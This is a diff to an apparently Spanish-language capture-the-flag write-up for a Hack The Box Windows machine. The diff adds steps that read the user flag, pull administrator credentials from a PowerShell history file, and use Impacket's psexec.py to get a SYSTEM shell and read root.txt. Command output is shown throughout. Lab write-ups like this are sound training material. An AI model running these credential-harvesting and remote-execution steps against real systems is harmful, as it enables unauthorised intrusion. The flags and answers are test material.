@@ -246,5 +246,52 @@ connect to [10.10.16.54] from (UNKNOWN) [10.10.10.27] 49688
 "whoami "
 sql_svc
 ```
+Obtencion de la flag USER.TXT
+```bash
+Directory of C:\Users\sql_svc\Desktop
+
+01/20/2020  06:42 AM    <DIR>          .
+01/20/2020  06:42 AM    <DIR>          ..
+02/25/2020  07:37 AM                32 user.txt
+               1 File(s)             32 bytes
+               2 Dir(s)  33,822,490,624 bytes free
+```
 Hasta aqui seria el Acceso Inicial.
-Posteriormente habria que Escalar Privilegios hasta el usuario administrador.
+Ahora a Escalar Privilegios hasta el usuario administrador.
+
+# Escalada de Privilegios
+
+Encontramos en esta ruta las siguientes credenciales
+```bash
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Console Host_history.txt
+
+"USER: administrator   "
+"PASS: MEGACORP_4dm1n!!  "
+```
+Con la herramienta PSEXEC.PY:
+```bash
+┌──(pro㉿pro)-[/opt]
+└─$" /usr/bin/python3 /opt/impacket/examples/psexec.py administrator@10.10.10.27    "                                                                             1 ⨯
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:  MEGACORP_4dm1n!!
+[*] Requesting shares on 10.10.10.27.....
+[*] Found writable share ADMIN$
+[*] Uploading file ppQcueTy.exe
+[*] Opening SVCManager on 10.10.10.27.....
+[*] Creating service EPRJ on 10.10.10.27.....
+[*] Starting service EPRJ.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+"C:\Users\sql_svc\Desktop>whoami
+nt authority\system "
+```
+Obtendriamos una shell como administrador en la maquina victima.
+Procedemos a sacar la flag del administrador o root.txt
+
+```bash
+"C:\Users\Administrator\Desktop>type root*    
+b91ccec3305e98240082d4474b------    "
+```
